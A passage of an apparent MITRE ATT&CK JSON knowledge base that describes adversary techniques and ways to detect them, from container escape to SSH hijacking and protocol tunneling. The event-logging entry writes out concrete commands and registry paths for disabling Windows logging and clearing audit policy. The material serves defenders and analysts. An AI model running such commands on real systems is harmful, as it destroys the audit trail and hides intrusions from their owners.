        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1564.011": {
      "id": "T1564.011",
      "name": "Ignore Process Interrupts",
      "description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.011",
      "stix_id": "attack-pattern--4a2975db-414e-4c0c-bd92-775987514b4b",
      "created": "2023-08-24T17:23:34.470000+00:00",
      "modified": "2025-04-15T22:41:11.807000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1611": {
      "id": "T1611",
      "name": "Escape to Host",
      "description": "Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nIn ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.(Citation: Broadcom VMSA-2025-004)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1611",
      "stix_id": "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665",
      "created": "2021-03-30T17:38:34.277000+00:00",
      "modified": "2025-04-15T19:58:28.417000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Kernel: Kernel Module Load",
        "Container: Container Creation",
        "Volume: Volume Modification",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations."
    },
    "T1547.009": {
      "id": "T1547.009",
      "name": "Shortcut Modification",
      "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.009",
      "stix_id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
      "created": "2020-01-24T19:00:32.917000+00:00",
      "modified": "2025-04-15T19:58:28.507000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\nMonitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)"
    },
    "T1010": {
      "id": "T1010",
      "name": "Application Window Discovery",
      "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1010",
      "stix_id": "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830",
      "created": "2017-05-31T21:30:24.512000+00:00",
      "modified": "2025-04-15T21:49:50.019000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1569.003": {
      "id": "T1569.003",
      "name": "Systemctl",
      "description": "Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.   \n\nAdversaries may use systemctl to execute commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s. Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl 2022)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1569.003",
      "stix_id": "attack-pattern--4b46767d-4a61-4f30-995e-c19a75c2e536",
      "created": "2025-03-18T13:44:12.618000+00:00",
      "modified": "2025-04-15T19:58:28.694000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Service: Service Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1087.003": {
      "id": "T1087.003",
      "name": "Email Account",
      "description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)\n\nIn on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1087.003",
      "stix_id": "attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470",
      "created": "2020-02-21T21:08:33.237000+00:00",
      "modified": "2025-04-15T22:25:10.775000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1497.003": {
      "id": "T1497.003",
      "name": "Time Based Evasion",
      "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1497.003",
      "stix_id": "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0",
      "created": "2020-03-06T21:11:11.225000+00:00",
      "modified": "2025-04-15T19:58:29.032000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. "
    },
    "T1218.003": {
      "id": "T1218.003",
      "name": "CMSTP",
      "description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.003",
      "stix_id": "attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49",
      "created": "2020-01-23T18:27:30.656000+00:00",
      "modified": "2025-04-15T19:58:29.296000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\n\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)\n\n* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\n* To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F)."
    },
    "T1563.001": {
      "id": "T1563.001",
      "name": "SSH Hijacking",
      "description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1563.001",
      "stix_id": "attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8",
      "created": "2020-02-25T18:34:38.290000+00:00",
      "modified": "2025-04-15T21:40:37.838000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Network Traffic: Network Traffic Content",
        "Command: Command Execution",
        "Logon Session: Logon Session Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users."
    },
    "T1562.002": {
      "id": "T1562.002",
      "name": "Disable Windows Event Logging",
      "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.002",
      "stix_id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
      "created": "2020-02-21T20:46:36.688000+00:00",
      "modified": "2025-04-16T20:37:17.061000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Sensor Health: Host Status",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Script: Script Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  \n\nIn Event Viewer, Event ID 1102 under the \u201cSecurity\u201d Windows Log and Event ID 104 under the \u201cSystem\u201d Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.\n\nMonitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)"
    },
    "T1029": {
      "id": "T1029",
      "name": "Scheduled Transfer",
      "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1029",
      "stix_id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
      "created": "2017-05-31T21:30:34.139000+00:00",
      "modified": "2025-04-15T23:03:03.336000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious."
    },
    "T1021.002": {
      "id": "T1021.002",
      "name": "SMB/Windows Admin Shares",
      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.002",
      "stix_id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
      "created": "2020-02-11T18:25:28.212000+00:00",
      "modified": "2025-04-15T19:58:29.701000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Share: Network Share Access",
        "Network Traffic: Network Traffic Flow",
        "Logon Session: Logon Session Creation",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)"
    },
    "T1525": {
      "id": "T1525",
      "name": "Implant Internal Image",
      "description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1525",
      "stix_id": "attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f",
      "created": "2019-09-04T12:04:03.552000+00:00",
      "modified": "2025-04-25T15:15:30.983000+00:00",
      "platforms": [
        "IaaS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Image: Image Metadata",
        "Image: Image Creation",
        "Image: Image Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.\n\nIn containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration. "
    },
    "T1572": {
      "id": "T1572",
      "name": "Protocol Tunneling",
      "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia Abyss Locker 2025) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1572",
      "stix_id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b",
      "created": "2020-03-15T16:03:39.082000+00:00",
      "modified": "2025-04-15T19:58:29.875000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)"
    },
    "T1218.002": {
      "id": "T1218.002",
      "name": "Control Panel",
      "description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 